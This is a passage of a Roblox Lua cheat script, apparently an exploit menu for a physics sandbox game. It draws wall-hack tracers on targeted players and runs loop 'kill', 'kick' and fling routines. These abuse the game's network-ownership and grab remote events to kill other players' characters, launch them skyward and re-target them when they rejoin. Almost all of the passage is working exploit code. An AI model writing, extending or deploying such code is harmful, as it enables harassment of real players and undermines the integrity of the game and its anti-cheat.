    hl.Adornee = char
    hl.OutlineColor = Color3.fromRGB(255, 255, 255)
    hl.OutlineTransparency = 0
    hl.FillColor = Color3.fromRGB(255, 255, 255)
    hl.FillTransparency = 1
    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    hl.Parent = char
    shadow = Drawing.new('Line')
    shadow.Thickness = 3
    shadow.Color = Color3.fromRGB(20, 20, 20)
    shadow.Transparency = 0.55
    shadow.Visible = false
    core = Drawing.new('Line')
    core.Thickness = 1.5
    core.Color = Color3.fromRGB(255, 255, 255)
    core.Transparency = 1
    core.Visible = false

    local dot = Drawing.new('Circle')

    dot.Radius = 3
    dot.Color = Color3.fromRGB(255, 80, 80)
    dot.Thickness = 1.5
    dot.Filled = true
    dot.Transparency = 1
    dot.Visible = false
    camera = workspace.CurrentCamera

    function getOrigin()
        local vp = camera.ViewportSize

        return Vector2.new(vp.X * 0.5, vp.Y)
    end

    conn = RunService.RenderStepped:Connect(function()
        if not _tracerEnabled then
            return
        end
        if not hrp or not hrp.Parent then
            core.Visible = false
            shadow.Visible = false
            dot.Visible = false

            return
        end

        origin = getOrigin()
        cam = camera
        toTarget = hrp.Position - cam.CFrame.Position
        lookVec = cam.CFrame.LookVector
        inFront = toTarget:Dot(lookVec) > 0

        local tipPos

        if inFront then
            local screenPos, onScreen = cam:WorldToViewportPoint(hrp.Position)

            if onScreen then
                tipPos = Vector2.new(screenPos.X, screenPos.Y)
            else
                local vp = cam.ViewportSize
                local raw = Vector2.new(screenPos.X, screenPos.Y)

                tipPos = Vector2.new(math.clamp(raw.X, 0, vp.X), math.clamp(raw.Y, 0, vp.Y))
            end
        else
            local vp = cam.ViewportSize
            local centre = Vector2.new(vp.X * 0.5, vp.Y * 0.5)
            local rightVec = cam.CFrame.RightVector
            local upVec = cam.CFrame.UpVector
            local sx = toTarget:Dot(rightVec)
            local sy = -toTarget:Dot(upVec)
            local dir2 = Vector2.new(sx, sy)

            if dir2.Magnitude > 0 then
                dir2 = dir2.Unit
            end

            local edgeX = sx > 0 and (vp.X - 10) or 10
            local edgeY = math.clamp(centre.Y + dir2.Y * vp.Y * 0.4, 10, vp.Y - 10)

            tipPos = Vector2.new(edgeX, edgeY)
        end

        core.From = origin
        core.To = tipPos
        core.Visible = true
        shadow.From = origin
        shadow.To = tipPos
        shadow.Visible = true
        dot.Position = tipPos
        dot.Visible = true

        if hl.Adornee ~= plr.Character then
            hl.Adornee = plr.Character
        end
    end)

    table.insert(_tracerConnections, conn)
    table.insert(_tracerObjects, {
        line = core,
        shadow = shadow,
        dot = dot,
        highlight = hl,
        conn = conn,
        username = plr.Name,
    })
end
function _rebuildTracers()
    _cleanupTracers()

    if not _tracerEnabled then
        return
    end

    for _, un in ipairs(_selectedPlayers)do
        local plr = Players:FindFirstChild(un)

        if plr then
            _buildTracerFor(plr)
        end
    end
end
function setTargetsFromTable(selectedMap, source)
    _selectedPlayers = {}

    for entry, state in pairs(selectedMap)do
        if state then
            local un = extractUsername(entry)

            if un then
                local plr = Players:FindFirstChild(un)

                if plr and plr ~= LocalPlayer then
                    table.insert(_selectedPlayers, un)
                end
            end
        end
    end

    _killRoundIndex = 1

    _syncPreviousTargets()

    local first = _selectedPlayers[1] and Players:FindFirstChild(_selectedPlayers[1])

    if first then
        pcall(function()
            BlobmanTarget:SetValue(first.DisplayName .. ' (' .. first.Name .. ')')
        end)
        pcall(function()
            GrabTarget:SetValue(first.DisplayName .. ' (' .. first.Name .. ')')
        end)
    end

    local count = #_selectedPlayers
    local src = source and (' [' .. source .. ']') or ''

    if count == 0 then
        notify('Target', 'No targets selected', 2)
    elseif count == 1 then
        local p = Players:FindFirstChild(_selectedPlayers[1])

        notify('Target set' .. src, p and (p.DisplayName .. ' (@' .. p.Name .. ')') or _selectedPlayers[1], 4)
    else
        notify('Target set' .. src, count .. ' players targeted', 4)
    end

    _updateAvatarDisplay()

    if _tracerEnabled then
        _rebuildTracers()
    end
end
function addTarget(plr, sourceTag)
    if plr == LocalPlayer then
        return
    end

    for _, un in ipairs(_selectedPlayers)do
        if un == plr.Name then
            notify('Target', plr.DisplayName .. 'Is already selected in your dropdown.', 2)

            return
        end
    end

    table.insert(_selectedPlayers, plr.Name)

    _previouslyTargeted[plr.Name] = true
    _dropdownUpdating = true

    pcall(function()
        PlayerDropdown:SetValue(plr.DisplayName .. ' (@' .. plr.Name .. ')')
    end)

    _dropdownUpdating = false

    notify('Target added', plr.DisplayName .. ' (@' .. plr.Name .. ')', 4)
    _updateAvatarDisplay()

    if _tracerEnabled then
        _rebuildTracers()
    end
end

TgtLeft:AddDivider()

AvatarImage = TgtLeft:AddImage('AvatarDisplay', {
    Image = 'rbxassetid://0',
    Callback = function() end,
})

TgtLeft:AddDivider()

SelectedLabel = TgtLeft:AddLabel("<b><font color='#aaaaaa'>Selected</font></b> <font color='#888888'>None</font>")
TargetDistLabel = TgtLeft:AddLabel("<b><font color='#aaaaaa'>Distance</font></b>  <font color='#555555'>\u{2014}</font>")
LastGrabberLabel = TgtLeft:AddLabel("<b><font color='#aaaaaa'>Last Grabber</font></b> <font color='#888888'>None</font>")

TgtLeft:AddDivider()

PlayerDropdown = TgtLeft:AddDropdown('PlayerDropdown', {
    Text = 'Select A Target',
    Values = getPlayerList(),
    Default = nil,
    Multi = true,
    Searchable = true,
    MaxVisibleDropdownItems = 10,
    SpecialType = 'Player',
    ExcludeLocalPlayer = true,
    Tooltip = 'Pick targets for all loop actions',
})

PlayerDropdown:OnChanged(function(v)
    if _dropdownUpdating then
        return
    end

    setTargetsFromTable(v, 'Dropdown')
end)
TgtLeft:AddDivider()

local ViewButton

ViewButton = TgtLeft:AddButton({
    Text = 'View Target',
    Func = function()
        if _isViewing then
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChildOfClass('Humanoid')

            if hum then
                workspace.CurrentCamera.CameraSubject = hum
            end

            workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
            _isViewing = false

            ViewButton:SetText('<b>View Target</b>')
            notify('View', 'Camera restored', 2)
        else
            local plr = _selectedPlayers[1] and Players:FindFirstChild(_selectedPlayers[1])

            if not plr or not plr.Character then
                return notify('View', 'No valid target', 2)
            end

            local hrp = plr.Character:FindFirstChild('HumanoidRootPart')

            if not hrp then
                return notify('View', 'No character root', 2)
            end

            workspace.CurrentCamera.CameraSubject = hrp
            workspace.CurrentCamera.CameraType = Enum.CameraType.Follow
            _isViewing = true

            ViewButton:SetText("<b><font color='#55e87a'>Unview Target</font></b>")
            notify('View', 'Now viewing ' .. plr.DisplayName, 3)
        end
    end,
})

TgtLeft:AddButton({
    Text = "<b><font color='#ff5050'>Clear All Targets</font></b>",
    Func = function()
        _selectedPlayers = {}
        _previouslyTargeted = {}
        _killRoundIndex = 1
        SelectedPlayer = nil
        _tracerEnabled = false

        _cleanupTracers()

        if _isViewing then
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChildOfClass('Humanoid')

            if hum then
                workspace.CurrentCamera.CameraSubject = hum
            end

            workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
            _isViewing = false

            ViewButton:SetText('<b>View Target</b>')
        end

        _refreshDropdown()
        _updateAvatarDisplay()
    end,
})
TgtLeft:AddDivider()
TgtLeft:AddLabel('Add Target'):AddKeyPicker('AimToTarget', {
    Default = 'LeftAlt',
    NoUI = false,
    Text = 'Aim To Target',
    Callback = function()
        local best = nil
        local tar = Mouse.Target

        if tar then
            local c = tar

            while c and c ~= workspace do
                local pl = Players:GetPlayerFromCharacter(c)

                if pl and pl ~= LocalPlayer then
                    best = pl

                    break
                end

                c = c.Parent
            end
        end
        if best then
            addTarget(best, 'AimKey')
        end
    end,
})
task.spawn(function()
    local prev = {
        sel = '',
        dist = '',
        grab = '',
    }

    while true do
        task.wait(0.5)

        local g = "<b><font color='#aaaaaa'>Last Grabber</font></b> <font color='#ff9955'>" .. lastGrabberDisplay .. '</font>'

        if g ~= prev.grab then
            prev.grab = g

            LastGrabberLabel:SetText(g)
        end

        local count = #_selectedPlayers
        local sel

        if count == 0 then
            sel = "<b><font color='#aaaaaa'>Selected</font></b> <font color='#555555'>None</font>"
        elseif count == 1 then
            local p = Players:FindFirstChild(_selectedPlayers[1])

            if p then
                sel = "<b><font color='#aaaaaa'>Selected</font></b> " .. "<font color='#fff'>" .. p.DisplayName .. '</font>' .. "<font color='#777'> (@" .. p.Name .. ')</font>'
            else
                sel = "<b><font color='#aaaaaa'>Selected</font></b> <font color='#555555'>left</font>"
            end
        else
            local t = {}

            for _, n in ipairs(_selectedPlayers)do
                local p = Players:FindFirstChild(n)

                table.insert(t, p and p.DisplayName or n)
            end

            sel = "<b><font color='#aaaaaa'>Selected</font></b> " .. "<font color='#fff'>" .. table.concat(t, ', ') .. '</font>'
        end
        if sel ~= prev.sel then
            prev.sel = sel

            SelectedLabel:SetText(sel)
        end

        local primary = _selectedPlayers[1] and Players:FindFirstChild(_selectedPlayers[1])
        local distText

        if primary and primary.Character then
            local hrp = primary.Character:FindFirstChild('HumanoidRootPart')
            local lhrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

            if hrp and lhrp then
                local d = math.floor((hrp.Position - lhrp.Position).Magnitude)
                local col = '#55e87a'

                if d < 50 then
                    col = '#ff5050'
                elseif d < 150 then
                    col = '#ffcc55'
                end

                distText = "<b><font color='#aaaaaa'>Distance</font></b> " .. "<font color='" .. col .. "'><b>" .. d .. ' studs</b></font>'
            end
        end

        distText = distText or "<b><font color='#aaaaaa'>Distance</font></b> <font color='#555555'>\u{2014}</font>"

        if distText ~= prev.dist then
            prev.dist = distText

            TargetDistLabel:SetText(distText)
        end
    end
end)
Players.PlayerAdded:Connect(function(plr)
    task.wait(0.5)

    if _previouslyTargeted[plr.Name] and plr ~= LocalPlayer then
        table.insert(_selectedPlayers, plr.Name)

        _killRoundIndex = 1
        _dropdownUpdating = true

        pcall(function()
            PlayerDropdown:SetValue(plr.DisplayName .. ' (@' .. plr.Name .. ')')
        end)

        _dropdownUpdating = false

        notify('Target Rejoined', plr.DisplayName, 6)

        if _tracerEnabled then
            task.wait(1)
            _rebuildTracers()
        end
    end

    _refreshDropdown()
end)
Players.PlayerRemoving:Connect(function(plr)
    task.wait(0.5)
    _removeFromTargets(plr.Name)
    _refreshDropdown()
end)

LoopKillList = {}
BlobKillList = {}
BlobkickList = {}
LocList = {}
Freelist = {}
whitelist = {}
BKA = false
BKLA = false
BKAWL = true
BKLAWL = true
OKA = false
OKLA = false
OWF = true
OKLWF = true
blob = nil
foundblob = false
hrp = nil
Changing = false
uid = 0
sellplr = nil
Players = game:GetService('Players')
RunService = game:GetService('RunService')
ReplicatedStorage = game:GetService('ReplicatedStorage')
LocalPlayer = Players.LocalPlayer

function checkgrab(itm)
    for _, prt in pairs(itm:GetChildren())do
        if prt:IsA('BasePart') and prt:FindFirstChild('PartOwner') and prt.PartOwner.Value == LocalPlayer.Name then
            return true
        end
    end
end

whitelist = whitelist or {}
friendWhitelistEnabled = false

function LoadFriendsIntoWhitelist()
    if not LocalPlayer then
        return
    end

    local success, pages = pcall(function()
        return LocalPlayer:GetFriendsAsync()
    end)

    if not success then
        return
    end

    repeat
        local currentPage = pages:GetCurrentPage()

        for _, friend in ipairs(currentPage)do
            if friend and friend.Id then
                whitelist[friend.Id] = true
            end
        end

        local done = pages.IsFinished

        if not done then
            pages:AdvanceToNextPageAsync()
        else
            break
        end
    until false
end
function BlobKick()
    while true do
        local gotsomeone = false
        local listtype = (BKA or BKLA) and 2 or 1

        for _, plr in pairs(Players:GetPlayers())do
            if BlobkickList[plr.UserId] or BlobKillList[plr.UserId] or BKA or BKLA then
                local j, h

                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
                    j = LocalPlayer.Character.HumanoidRootPart.CFrame
                    h = LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity
                end

                local continue1 = nil

                if BlobKillList[plr.UserId] then
                    continue1 = 'Kill'
                elseif BlobkickList[plr.UserId] then
                    continue1 = 'Kick'
                else
                    if BKA then
                        if not BKAWL or not whitelist[plr.UserId] then
                            continue1 = 'Kick'
                        end
                    end
                    if BKLA then
                        if not BKLAWL or not whitelist[plr.UserId] then
                            continue1 = 'Kill'
                        end
                    end
                end
                if plr ~= LocalPlayer and continue1 then
                    local continue = false

                    if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') then
                        if plr.Character.HumanoidRootPart.Massless then
                            if plr.Character.Humanoid.SeatPart then
                                continue = true
                            end
                        else
                            continue = true
                        end
                    end

                    local smegma = true

                    while smegma and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and plr and plr.Character and (continue1 == 'Kick' and plr.Character.Parent == workspace or continue1 == 'Kill') and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead and continue do
                        if listtype == 2 then
                            if not BKA and not BKLA then
                                smegma = false
                            elseif whitelist[plr.UserId] then
                                smegma = false
                            end
                        else
                            if not BlobkickList[plr.UserId] and not BlobKillList[plr.UserId] then
                                smegma = false
                            end
                        end

                        gotsomeone = true
                        continue = false

                        if continue1 == 'Kick' then
                            if plr.Character.HumanoidRootPart.Massless then
                                if plr.Character.Humanoid.SeatPart then
                                    continue = true
                                end
                            else
                                continue = true
                            end
                        else
                            continue = true
                        end

                        local vel = plr.Character.HumanoidRootPart.AssemblyLinearVelocity

                        if vel.Magnitude > 10000 then
                            vel = Vector3.zero
                        end
                        if plr.Character.HumanoidRootPart.CFrame.Position.Magnitude > 1000000 then
                            continue = false
                        end
                        if smegma and continue and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead and LocalPlayer.Character.Humanoid.SeatPart and LocalPlayer.Character.Humanoid.SeatPart.Parent and LocalPlayer.Character.Humanoid.SeatPart.Parent.Name == 'CreatureBlobman' then
                            blob = LocalPlayer.Character.Humanoid.SeatPart.Parent

                            if (plr.Character.HumanoidRootPart.CFrame.Position - LocalPlayer.Character.HumanoidRootPart.CFrame.Position + LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity).Magnitude > 30 and (continue1 == 'Kick' and plr.Character.Parent == workspace or continue1 == 'Kill') then
                                LocalPlayer.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + (plr.Character.HumanoidRootPart.AssemblyLinearVelocity / math.pi)
                                LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = plr.Character.HumanoidRootPart.AssemblyLinearVelocity

                                if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') then
                                    if continue1 == 'Kick' then
                                        ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(plr.Character.HumanoidRootPart, plr.Character.HumanoidRootPart.CFrame)
                                    else
                                        if plr.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead and blob and blob:FindFirstChild('RightDetector') and blob.RightDetector:FindFirstChild('RightWeld') and blob:FindFirstChild('BlobmanSeatAndOwnerScript') and blob.BlobmanSeatAndOwnerScript:FindFirstChild('CreatureGrab') and blob.BlobmanSeatAndOwnerScript:FindFirstChild('CreatureRelease') then
                                            plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                                            blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(blob.RightDetector, plr.Character.HumanoidRootPart, blob.RightDetector.RightWeld)
                                            blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(blob.RightDetector.RightWeld, plr.Character.HumanoidRootPart)
                                        end
                                    end
                                end
                            end
                            if continue1 == 'Kick' then
                                if plr.Character and checkgrab(plr.Character) and plr.Character:FindFirstChild('HumanoidRootPart') and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and blob and blob:FindFirstChild('RightDetector') and blob.RightDetector:FindFirstChild('RightWeld') and blob:FindFirstChild('BlobmanSeatAndOwnerScript') and blob.BlobmanSeatAndOwnerScript:FindFirstChild('CreatureGrab') then
                                    plr.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 1E10, 0)

                                    ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(plr.Character.HumanoidRootPart)
                                    blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(blob.RightDetector, plr.Character.HumanoidRootPart, blob.RightDetector.RightWeld)
                                else
                                    ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(plr.Character.HumanoidRootPart, plr.Character.HumanoidRootPart.CFrame)
                                end
                            else
                                if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and blob:FindFirstChild('RightDetector') and blob.RightDetector:FindFirstChild('RightWeld') and blob:FindFirstChild('BlobmanSeatAndOwnerScript') and blob.BlobmanSeatAndOwnerScript:FindFirstChild('CreatureGrab') and blob.BlobmanSeatAndOwnerScript:FindFirstChild('CreatureRelease') then
                                    plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                                    blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(blob.RightDetector, plr.Character.HumanoidRootPart, blob.RightDetector.RightWeld)
                                    blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(blob.RightDetector.RightWeld, plr.Character.HumanoidRootPart)
                                end
                            end
                        elseif continue then
                            if LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid.SeatPart and (LocalPlayer.Character.Humanoid.SeatPart.Parent and LocalPlayer.Character.Humanoid.SeatPart.Name ~= 'CreatureBlobman' or not LocalPlayer.Character.Humanoid.SeatPart.Parent) then
                                LocalPlayer.Character.Humanoid.Sit = false
                            end
                            if blob and blob:FindFirstChild('VehicleSeat') then
                                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
                                    blob.VehicleSeat:Sit(LocalPlayer.Character.Humanoid)
                                end
                            else
                                foundblob = false
                                blob = nil

                                for _, itm in pairs(workspace[LocalPlayer.Name .. 'SpawnedInToys']:GetChildren())do
                                    if itm.Name == 'CreatureBlobman' and itm:FindFirstChild('VehicleSeat') then
                                        foundblob = true
                                        blob = itm
                                    elseif itm.Name == 'CreatureBlobman' then
                                        while itm do
                                            ReplicatedStorage.MenuToys.DestroyToy:FireServer(itm)
                                            task.wait(0.1)
                                        end
                                    end
                                end

                                if blob and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
                                    blob.VehicleSeat:Sit(LocalPlayer.Character.Humanoid)
                                end
                                if not foundblob then
                                    task.wait(1)

                                    while smegma and not blob do
                                        if workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys'):FindFirstChild('CreatureBlobman') then
                                            blob = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys'):FindFirstChild('CreatureBlobman')
                                        else
                                            task.spawn(function()
                                                ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('CreatureBlobman', CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) + Vector3.new(0, 0, 15), Vector3.new(0, 0, 0))
                                            end)
                                        end

                                        task.wait()
                                    end
                                end
                            end
                        end

                        task.wait(0.1)
                    end

                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and j then
                        LocalPlayer.Character.HumanoidRootPart.CFrame = j
                        LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = h
                    end
                end
            end
        end

        if not gotsomeone and blob then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid.SeatPart and LocalPlayer.Character.Humanoid.SeatPart.Parent == blob then
                LocalPlayer.Character.Humanoid.Sit = false
            end

            task.wait()

            if blob and blob:FindFirstChild('HumanoidRootPart') then
                blob.HumanoidRootPart.CFrame = CFrame.new(0, 1e15, 0)
            end
        end

        task.wait()
    end
end

task.spawn(BlobKick)

function resolveUid(username)
    local p = Players:FindFirstChild(username)

    return p and p.UserId or nil
end
function syncTogglesToSelection()
    if #_selectedPlayers == 0 then
        return
    end

    local p = Players:FindFirstChild(_selectedPlayers[1])

    if not p then
        return
    end

    local id = p.UserId

    _dropdownUpdating = true

    Toggles.BlobLoopKick:SetValue(BlobkickList[id] ~= nil)
    Toggles.BlobLoopKill:SetValue(BlobKillList[id] ~= nil)
    Toggles.OwnershipLoopKill:SetValue(LoopKillList[id] ~= nil)
    Toggles.OwnershipKick:SetValue(LocList[id] == Vector3.new(0, 1e29, 0))

    _dropdownUpdating = false
end

SpawnToyRF = ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('SpawnToyRemoteFunction')
Struggle = ReplicatedStorage:WaitForChild('CharacterEvents'):WaitForChild('Struggle')
LoopBringActive = false
bringTimer = 0
tpTimer = 0
switchTimer = 0

function FWC(Parent, Name, Time)
    return Parent:FindFirstChild(Name) or Parent:WaitForChild(Name, Time)
end
function grab(prt)
    RemoteSetNetworkOwner:FireServer(prt, prt.CFrame)
end
function Destroy_Line(Part)
    if not Part or not Part.Parent then
        return
    end

    for _, v in pairs(Part.Parent:GetDescendants())do
        if v.Name == 'PartOwner' then
            RemoteDestroyGrabLine:FireServer(v.Parent)
        end
    end
end
function DisableCollisions(model)
    for _, d in ipairs(model:GetDescendants())do
        if d:IsA('BasePart') then
            d.CanCollide = false
        end
    end
end
function sendToSky(root, hum)
    DisableCollisions(hum.Parent)

    local BV = Instance.new('BodyVelocity')

    BV.Velocity = Vector3.new(0, 90000, 0)
    BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    BV.P = 100
    BV.Parent = root
    hum.Sit = false
    hum.Jump = true

    task.delay(3, function()
        if BV.Parent then
            BV:Destroy()
        end
    end)
end
function executeKick()
    if not SelectedPlayer then
        return
    end

    local p = Players:FindFirstChild(SelectedPlayer)
    local c = p and p.Character
    local root = c and c:FindFirstChild('HumanoidRootPart')
    local head = c and c:FindFirstChild('Head')
    local hum = c and c:FindFirstChild('Humanoid')

    if not (root and head and hum) or hum.Health <= 0 then
        return
    end
    if isTooHigh(p) then
        return
    end
    if p:FindFirstChild('InPlot') and p.InPlot.Value then
        return
    end

    local selfChar = LocalPlayer.Character
    local selfRoot = selfChar and selfChar:FindFirstChild('HumanoidRootPart')

    if not selfRoot then
        return
    end

    local saved = selfChar:GetPivot()

    selfChar:PivotTo(CFrame.new(root.Position + Vector3.new(0, 0, -3)))
    DisableCollisions(c)
    RemoteSetNetworkOwner:FireServer(root, root.CFrame)
    task.wait()
    selfChar:PivotTo(saved)
    task.wait(0.05)
    RemoteDestroyGrabLine:FireServer(root)
    task.wait(0.05)

    local po = head:FindFirstChild('PartOwner')

    if po and po.Value == LocalPlayer.Name then
        sendToSky(root, hum)
    end
end

GrabKickHB = nil
LoopGrabKickOn = false

function executeGrabKick()
    if not SelectedPlayer then
        return
    end

    local targetPlayer = Players:FindFirstChild(SelectedPlayer)

    if not targetPlayer or not targetPlayer.Character then
        return
    end

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')
    local head = char and char:FindFirstChild('Head')

    if not (char and hrp and head) then
        return
    end

    local targetChar = targetPlayer.Character
    local targetHrp = targetChar:FindFirstChild('HumanoidRootPart')
    local targetHead = targetChar:FindFirstChild('Head')
    local Hum = targetChar:FindFirstChild('Humanoid')

    if not (targetHrp and targetHead and Hum) or Hum.Health == 0 then
        return
    end

    local BodyPos = targetHrp:FindFirstChild('BodyPosition')
    local BodyGyro = targetHrp:FindFirstChild('BodyGyro')

    if not BodyPos then
        BodyPos = Instance.new('BodyPosition')
        BodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        BodyPos.Parent = targetHrp
        BodyPos.P = 50000
        BodyPos.D = 1000
    end
    if not BodyGyro then
        BodyGyro = Instance.new('BodyGyro')
        BodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        BodyGyro.Parent = targetHrp
        BodyGyro.P = 50000
        BodyGyro.D = 1000
    end

    BodyPos.Position = head.Position + Vector3.new(0, 18, 0)
    BodyGyro.CFrame = hrp.CFrame

    RemoteSetNetworkOwner:FireServer(targetHrp, targetHrp.CFrame)
    RemoteSetNetworkOwner:FireServer(targetHead, targetHead.CFrame)
    RemoteDestroyGrabLine:FireServer(targetHrp)
    RemoteDestroyGrabLine:FireServer(targetHead)

    if (targetHrp.Position - hrp.Position).Magnitude > 35 then
        local oldCF = char:GetPivot()

        repeat
            if not LoopGrabKickOn then
                break
            end

            char:PivotTo(targetHrp.CFrame * CFrame.new(0, 0, -10))
            RemoteSetNetworkOwner:FireServer(targetHrp, targetHrp.CFrame)
            RemoteSetNetworkOwner:FireServer(targetHead, targetHead.CFrame)
            task.wait()
        until (targetHrp.Position - hrp.Position).Magnitude <= 35 or targetHead:FindFirstChild('PartOwner') or not LoopGrabKickOn

        char:PivotTo(oldCF)
    end
end
function StartLoopGrabKick()
    if GrabKickHB then
        GrabKickHB:Disconnect()
    end

    LoopGrabKickOn = true
    GrabKickHB = RunService.Heartbeat:Connect(function()
        if LoopGrabKickOn then
            executeGrabKick()
        end
    end)
end
function StopLoopGrabKick()
    LoopGrabKickOn = false

    if GrabKickHB then
        GrabKickHB:Disconnect()

        GrabKickHB = nil
    end
    if SelectedPlayer then
        local tp = Players:FindFirstChild(SelectedPlayer)

        if tp and tp.Character then
            local tHrp = tp.Character:FindFirstChild('HumanoidRootPart')

            if tHrp then
                if tHrp:FindFirstChild('BodyPosition') then
                    tHrp.BodyPosition:Destroy()
                end
                if tHrp:FindFirstChild('BodyGyro') then
                    tHrp.BodyGyro:Destroy()
                end
            end
        end
    end
end
function sno(part)
    if not part or not part.Parent then
        return
    end

    pcall(function()
        ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(part, part.CFrame)
    end)
end

TargetPlayer = nil
HRP = nil
kickLoopEnabled = false

function GetClosestPlayerFromCursor()
    local targetPart = Mouse.Target

    if not targetPart then
        return nil
    end

    local character = targetPart:FindFirstAncestorOfClass('Model')

    if not character then
        return nil
    end

    return Players:GetPlayerFromCharacter(character)
end

Players = game:GetService('Players')
RunService = game:GetService('RunService')
ReplicatedStorage = game:GetService('ReplicatedStorage')
Workspace = game:GetService('Workspace')
DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
SetNetOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
DestroyLine = ReplicatedStorage.GrabEvents.DestroyGrabLine
SpawnToy = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
Ragdoll = ReplicatedStorage.CharacterEvents.RagdollRemote
plr = Players.LocalPlayer
char = plr.Character or plr.CharacterAdded:Wait()
HRP = char:WaitForChild('HumanoidRootPart')
hum = char:WaitForChild('Humanoid')
inv = Workspace:WaitForChild(plr.Name .. 'SpawnedInToys')
cons = {}

local offset = CFrame.new(0, 15, 0)

Sets = {
    Name = nil,
    Char = nil,
    HRP = nil,
}

local kickbp = nil
local kickbg = nil
local PalletForRagdoll = nil

function stvel(part)
    part.AssemblyLinearVelocity = Vector3.zero
    part.AssemblyAngularVelocity = Vector3.zero
end
function sno(obj)
    SetNetOwner:FireServer(obj, obj.CFrame)
end
function gblob()
    local char = plr.Character
    local hum = char and char:FindFirstChild('Humanoid')

    if hum and hum.SeatPart and hum.SeatPart.Parent.Name == 'CreatureBlobman' then
        return hum.SeatPart.Parent
    end
end
function getplot()
    for i = 1, 5 do
        local plot = Workspace.Plots:FindFirstChild('Plot' .. i)
        local val = plot and plot.PlotSign.ThisPlotsOwners:FindFirstChild('Value')

        if plot and val and val.Value:find(plr.Name) then
            return plot
        end
    end
end
function spawntoy(toy, cf)
    if not plr.CanSpawnToy.Value then
        plr.CanSpawnToy.Changed:Wait()
    end

    local t
    local toyadded = inv.ChildAdded:Connect(function(c)
        if c.Name == toy then
            t = c

            toyadded:Disconnect()
        end
    end)

    task.spawn(function()
        SpawnToy:InvokeServer(toy, cf, Vector3.new(0, 0, 0))
    end)

    local timeout = tick() + 1

    repeat
        task.wait()
    until t or tick() > timeout

    if t then
        return t
    else
        local plot = getplot()

        if plot then
            return Workspace.PlotItems[plot.Name]:FindFirstChild(toy) or Workspace.PlotItems[plot.Name]:WaitForChild(toy, 0.5)
        end
    end
end
function tp(obj1, obj2)
    obj1.CFrame = CFrame.new(obj2.Position + obj2.Velocity * (game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue() / 1000) * 5)
end

local lastPlotWarn = 0

function notify(msg, time)
    Library:Notify({
        Title = '<b>UNSTABLE</b>',
        Description = msg,
        Time = time or 3,
    })
end
function getPlayerPlot(player)
    for i = 1, 5 do
        local plot = Workspace.Plots:FindFirstChild('Plot' .. i)
        local val = plot and plot.PlotSign.ThisPlotsOwners:FindFirstChild('Value')

        if plot and val and tostring(val.Value):find(player.Name) then
            return plot
        end
    end
end
function targetInPlot(player)
    if not player or not player.Character then
        return false
    end

    local chr = player.Character
    local hrp = chr:FindFirstChild('HumanoidRootPart')
    local plot = getPlayerPlot(player)

    if not hrp or not plot then
        return false
    end

    local base = plot:FindFirstChild('Base') or plot:FindFirstChildWhichIsA('BasePart')

    if not base then
        return false
    end

    local pos = base.CFrame:PointToObjectSpace(hrp.Position)
    local half = base.Size / 2

    return math.abs(pos.X) <= half.X and math.abs(pos.Z) <= half.Z and math.abs(pos.Y) <= (half.Y + 25)
end
function warnPlot(player)
    if tick() - lastPlotWarn > 2 then
